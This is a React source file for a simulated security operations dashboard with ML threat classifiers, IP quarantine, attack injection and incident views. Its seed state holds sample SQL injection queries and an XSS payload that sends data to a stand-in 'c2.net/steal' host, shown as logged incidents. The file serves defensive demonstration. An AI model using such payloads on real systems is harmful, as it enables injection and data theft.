import React, { useState, useEffect } from 'react';
import Navbar from './components/Navbar';
import Sidebar from './components/Sidebar';
import AuthLoginView from './views/AuthLoginView';
import DashboardView from './views/DashboardView';
import AIThreatDetectionView from './views/AIThreatDetectionView';
import DBFirewallView from './views/DBFirewallView';
import DataSafetyView from './views/DataSafetyView';
import DataMiningStudioView from './views/DataMiningStudioView';
import PayloadSandboxView from './views/PayloadSandboxView';
import UserSafetyAuthView from './views/UserSafetyAuthView';
import IncidentForensicsView from './views/IncidentForensicsView';
import SecureFileManagerView from './views/SecureFileManagerView';
import { SAMPLE_BENCHMARKS } from './data-mining/datasetGenerator';
import { extractPayloadFeatures } from './data-mining/featureExtractor';
import { 
  CyberRandomForest, 
  CyberNeuralNetwork, 
  CyberKNN, 
  CyberSVM, 
  CyberNaiveBayes 
} from './data-mining/mlModels';
import { generateTrainingDataset } from './data-mining/datasetGenerator';
import { INITIAL_USER } from './auth/authStore';
import { threatAudio } from './components/ThreatAudio';
import { apiService } from './services/apiService';
import { socketService } from './services/socketService';

export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [activeTab, setActiveTab] = useState('dashboard');
  const [currentUser, setCurrentUser] = useState(INITIAL_USER);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [threatLevel, setThreatLevel] = useState('NORMAL');
  const [emergencyActive, setEmergencyActive] = useState(false);
  const [selectedModelType, setSelectedModelType] = useState('RF');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  // Real Server Status & Hardware Telemetry
  const [serverStatus, setServerStatus] = useState({ online: false, latency: null });
  const [systemMetrics, setSystemMetrics] = useState({
    cpu: { usagePercent: 14, cores: 8, model: 'SOC Host Processor' },
    memory: { totalMB: 16384, usedMB: 3940, usedPercent: 24 },
    uptimeFormatted: '0d 14h 22m 04s'
  });

  // Live Stream State
  const [isStreaming, setIsStreaming] = useState(true);
  const [packets, setPackets] = useState(() => generateTrainingDataset(1).slice(0, 10));
  const [activePacket, setActivePacket] = useState(() => packets[0]);
  const [blockedQueries, setBlockedQueries] = useState([
    { query: "SELECT * FROM users WHERE username = 'admin' OR 1=1", risk: 85, time: '19:40:12', ip: '45.33.32.156' },
    { query: "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users", risk: 90, time: '19:42:01', ip: '185.220.101.5' }
  ]);
  const [quarantinedIPs, setQuarantinedIPs] = useState([
    { ip: '45.33.32.156', reason: 'SQL Injection Attack Vector', time: '19:40:12' },
    { ip: '185.220.101.5', reason: 'Union Schema Exfiltration Probe', time: '19:42:01' },
    { ip: '194.26.29.112', reason: 'Brute Force Credential Burst', time: '19:35:44' }
  ]);
  const [incidentLogs, setIncidentLogs] = useState([
    { ip: '45.33.32.156', type: 'SQLI', payload: "SELECT * FROM users WHERE '1'='1'", time: '19:40:12', action: 'INTERCEPTED & BLOCKED' },
    { ip: '185.220.101.5', type: 'XSS', payload: '<script>fetch("http://c2.net/steal")</script>', time: '19:42:01', action: 'SANITIZED & LOGGED' },
    { ip: '103.145.13.2', type: 'DDOS', payload: 'SYN_FLOOD_BURST: 85000 pkts/s', time: '19:43:10', action: 'RATE LIMITED' }
  ]);

  // Model Zoo State
  const [rfModel, setRfModel] = useState(null);
  const [mlpModel, setMlpModel] = useState(null);
  const [knnModel, setKnnModel] = useState(null);
  const [svmModel, setSvmModel] = useState(null);
  const [nbModel, setNbModel] = useState(null);
  const [modelPredictions, setModelPredictions] = useState(null);

  // Train initial client models zoo on mount
  useEffect(() => {
    const trainData = generateTrainingDataset(4);
    const rf = new CyberRandomForest(9, 5);
    rf.train(trainData);
    const mlp = new CyberNeuralNetwork(10, 16, 8);
    mlp.train(trainData);
    const knn = new CyberKNN(5);
    knn.train(trainData);
    const svm = new CyberSVM();
    svm.train(trainData);
    const nb = new CyberNaiveBayes();
    nb.train(trainData);

    setRfModel(rf);
    setMlpModel(mlp);
    setKnnModel(knn);
    setSvmModel(svm);
    setNbModel(nb);
  }, []);

  // Check Real Backend Health & Connect WebSocket
  useEffect(() => {
    const checkServer = async () => {
      const health = await apiService.checkHealth();
      setServerStatus(health);
      if (health.online) {
        try {
          const metrics = await apiService.getSystemMetrics();
          setSystemMetrics(metrics);
        } catch (e) {}
      }
    };

    checkServer();
    const timer = setInterval(checkServer, 4000);

    // Connect WebSocket
    socketService.connect();

    const unbindInitial = socketService.on('INITIAL_STATE', (data) => {
      if (data.packets && data.packets.length > 0) {
        setPackets(data.packets);
        setActivePacket(data.packets[0]);
      }
      if (data.quarantinedIPs) setQuarantinedIPs(data.quarantinedIPs);
      if (data.systemMetrics) setSystemMetrics(data.systemMetrics);
      if (data.socStatus) {
        setEmergencyActive(Boolean(data.socStatus.emergencyLockdown));
        setThreatLevel(data.socStatus.threatLevel || 'NORMAL');
      }
    });

    const unbindStream = socketService.on('PACKET_STREAM', (data) => {
      if (data.packet) {
        setPackets(prev => [data.packet, ...prev.slice(0, 24)]);
        setActivePacket(data.packet);
        if (data.packet.label !== 'NORMAL') setThreatLevel('ELEVATED');
      }
      if (data.systemMetrics) setSystemMetrics(data.systemMetrics);
    });

    const unbindInject = socketService.on('ATTACK_INJECTED', (data) => {
      if (data.packet) {
        setPackets(prev => [data.packet, ...prev.slice(0, 24)]);
        setActivePacket(data.packet);
        setThreatLevel('CRITICAL');
      }
    });

    const unbindQuarantine = socketService.on('IP_QUARANTINED', (data) => {
      if (data.entry) {
        setQuarantinedIPs(prev => [data.entry, ...prev.filter(q => q.ip !== data.entry.ip)]);
      }
    });

    const unbindUnban = socketService.on('IP_UNBANNED', (data) => {
      if (data.ip) {
        setQuarantinedIPs(prev => prev.filter(q => q.ip !== data.ip));
      }
    });

    const unbindLockdown = socketService.on('EMERGENCY_LOCKDOWN_TOGGLE', (data) => {
      setEmergencyActive(data.emergencyLockdown);
      setThreatLevel(data.threatLevel);
    });

    return () => {
      clearInterval(timer);
      unbindInitial();
      unbindStream();
      unbindInject();
      unbindQuarantine();
      unbindUnban();
      unbindLockdown();
    };
  }, []);

  // Fallback Local Traffic Generator Interval (active if backend is offline)
  useEffect(() => {
    if (!isStreaming || !isAuthenticated || serverStatus.online) return;

    const interval = setInterval(() => {
      const randomBenchmark = SAMPLE_BENCHMARKS[Math.floor(Math.random() * SAMPLE_BENCHMARKS.length)];
      const feat = extractPayloadFeatures(randomBenchmark.payload);

      const newPacket = {
        id: `pkt-${Date.now()}-${Math.floor(Math.random()*1000)}`,
        payload: randomBenchmark.payload,
        label: randomBenchmark.label,
        ip: randomBenchmark.ip,
        port: randomBenchmark.port,
        entropy: feat.entropy,
        timestamp: new Date().toISOString()
      };

      setPackets(prev => [newPacket, ...prev.slice(0, 19)]);
      setActivePacket(newPacket);

      if (rfModel && nbModel) {
        const rfPred = rfModel.predict(feat.featureVector);
        const nbPred = nbModel.predict(feat.featureVector);
        const mlpPred = mlpModel ? mlpModel.predict(feat.featureVector) : null;
        const knnPred = knnModel ? knnModel.predict(feat.featureVector) : null;
        const svmPred = svmModel ? svmModel.predict(feat.featureVector) : null;

        setModelPredictions({ 
          rf: rfPred, 
          nb: nbPred,
          mlp: mlpPred,
          knn: knnPred,
          svm: svmPred
        });

        if (newPacket.label !== 'NORMAL') {
          setThreatLevel('ELEVATED');
        }
      }
    }, 2200);

    return () => clearInterval(interval);
  }, [isStreaming, isAuthenticated, serverStatus.online, rfModel, mlpModel, knnModel, svmModel, nbModel]);

  // Handlers
  const handleLoginSuccess = (user) => {
    setCurrentUser(user);
    setIsAuthenticated(true);
    threatAudio.playSuccess();
  };

  const handleLogout = () => {
    apiService.setToken('');
    setIsAuthenticated(false);
  };

  const handleInjectAttack = async (type) => {
    try {
      if (serverStatus.online) {
        await apiService.injectAttack(type);
      }
    } catch (e) {
      console.warn('Server inject failed, using local simulation:', e);
    }

    const candidates = SAMPLE_BENCHMARKS.filter(s => s.label === type);
    const chosen = candidates[Math.floor(Math.random() * candidates.length)] || SAMPLE_BENCHMARKS[6];
    const feat = extractPayloadFeatures(chosen.payload);

    const injected = {
      id: `inject-${Date.now()}`,
      payload: chosen.payload,
      label: chosen.label,
      ip: chosen.ip,
      port: chosen.port,
      entropy: feat.entropy,
      timestamp: new Date().toISOString()
    };

    setPackets(prev => [injected, ...prev.slice(0, 19)]);
    setActivePacket(injected);
    setThreatLevel('CRITICAL');

    setIncidentLogs(prev => [
      { ip: injected.ip, type: injected.label, payload: injected.payload, time: new Date().toTimeString().slice(0, 8), action: 'AI DETECTED & ISOLATED' },
      ...prev.slice(0, 15)
    ]);
  };

  const handleQuarantineIP = async (ip, reason = 'Automated Malicious Vector Quarantine') => {
    try {
      if (serverStatus.online) {
        await apiService.quarantineIP(ip, reason);
      }
    } catch (e) {}

    if (!quarantinedIPs.some(q => q.ip === ip)) {
      setQuarantinedIPs(prev => [
        { ip, reason, time: new Date().toTimeString().slice(0, 8) },
        ...prev
      ]);
    }
  };

  const handleUnbanIP = async (ip) => {
    try {
      if (serverStatus.online) {
        await apiService.unbanIP(ip);
      }
    } catch (e) {}

    setQuarantinedIPs(quarantinedIPs.filter(q => q.ip !== ip));
  };

  const handleQueryBlocked = (query, risk) => {
    setBlockedQueries(prev => [
      { query, risk, time: new Date().toTimeString().slice(0, 8), ip: '45.33.32.156' },
      ...prev.slice(0, 15)
    ]);
  };

  const handleEmergencyLockdown = async () => {
    try {
      if (serverStatus.online) {
        await apiService.toggleEmergencyLockdown();
      }
    } catch (e) {}

    setEmergencyActive(prev => !prev);
    setThreatLevel(prev => prev === 'CRITICAL' ? 'NORMAL' : 'CRITICAL');
  };

  const handleResetSystem = () => {
    setPackets(generateTrainingDataset(1).slice(0, 10));
    setThreatLevel('NORMAL');
    setEmergencyActive(false);
    threatAudio.playSuccess();
  };

  const handleCustomAnalyze = (customText) => {
    const feat = extractPayloadFeatures(customText);
    const customPkt = {
      id: `custom-${Date.now()}`,
      payload: customText,
      label: feat.sqlKeywordCount > 0 ? 'SQLI' : feat.xssPatternCount > 0 ? 'XSS' : 'NORMAL',
      ip: '10.0.0.99',
      port: 443,
      entropy: feat.entropy,
      timestamp: new Date().toISOString()
    };

    setPackets(prev => [customPkt, ...prev.slice(0, 19)]);
    setActivePacket(customPkt);
  };

  // If not authenticated, render the dedicated Full-Screen Login Portal
  if (!isAuthenticated) {
    return <AuthLoginView onLoginSuccess={handleLoginSuccess} />;
  }

  return (
    <div className="min-h-screen flex flex-col bg-cyber-bg text-slate-100 font-sans selection:bg-cyan-500/30 selection:text-cyan-200">
      <Navbar
        currentUser={currentUser}
        threatLevel={threatLevel}
        soundEnabled={soundEnabled}
        setSoundEnabled={setSoundEnabled}
        onEmergencyLockdown={handleEmergencyLockdown}
        emergencyActive={emergencyActive}
        onResetSystem={handleResetSystem}
        onLogout={handleLogout}
        serverStatus={serverStatus}
        systemMetrics={systemMetrics}
        mobileMenuOpen={mobileMenuOpen}
        onToggleMobileMenu={() => setMobileMenuOpen(prev => !prev)}
      />

      <div className="flex-1 flex flex-col lg:flex-row min-h-[calc(100vh-65px)]">
        <Sidebar
          activeTab={activeTab}
          setActiveTab={(tab) => {
            setActiveTab(tab);
            setMobileMenuOpen(false);
          }}
          blockedCount={blockedQueries.length}
          incidentCount={incidentLogs.length}
          mobileMenuOpen={mobileMenuOpen}
          onCloseMobileMenu={() => setMobileMenuOpen(false)}
        />

        <main className="flex-1 p-3 sm:p-4 lg:p-6 overflow-y-auto max-w-7xl mx-auto w-full">
          {activeTab === 'dashboard' && (
            <DashboardView
              packets={packets}
              blockedQueries={blockedQueries}
              quarantinedIPs={quarantinedIPs}
              onQuarantineIP={handleQuarantineIP}
              onNavigateTab={setActiveTab}
              onInjectAttack={handleInjectAttack}
              systemMetrics={systemMetrics}
              serverStatus={serverStatus}
            />
          )}

          {activeTab === 'ai-threat' && (
            <AIThreatDetectionView
              packets={packets}
              activePacket={activePacket}
              isStreaming={isStreaming}
              setIsStreaming={setIsStreaming}
              modelPredictions={modelPredictions}
              onInjectAttack={handleInjectAttack}
              onQuarantineIP={handleQuarantineIP}
              onCustomAnalyze={handleCustomAnalyze}
              selectedModelType={selectedModelType}
              setSelectedModelType={setSelectedModelType}
            />
          )}

          {activeTab === 'db-firewall' && (
            <DBFirewallView
              onQueryBlocked={handleQueryBlocked}
            />
          )}

          {activeTab === 'data-safety' && (
            <DataSafetyView
              currentUser={currentUser}
              onNavigateTab={setActiveTab}
              onDeployToDB={(records) => {
                threatAudio.playSuccess();
              }}
            />
          )}

          {activeTab === 'data-mining' && (
            <DataMiningStudioView 
              onNavigateTab={setActiveTab}
            />
          )}

          {activeTab === 'file-manager' && (
            <SecureFileManagerView />
          )}

          {activeTab === 'sandbox' && (
            <PayloadSandboxView />
          )}

          {activeTab === 'user-safety' && (
            <UserSafetyAuthView
              currentUser={currentUser}
              setCurrentUser={setCurrentUser}
            />
          )}

          {activeTab === 'forensics' && (
            <IncidentForensicsView
              quarantinedIPs={quarantinedIPs}
              onUnbanIP={handleUnbanIP}
              onAddQuarantineIP={handleQuarantineIP}
              incidentLogs={incidentLogs}
            />
          )}
        </main>
      </div>
    </div>
  );
}
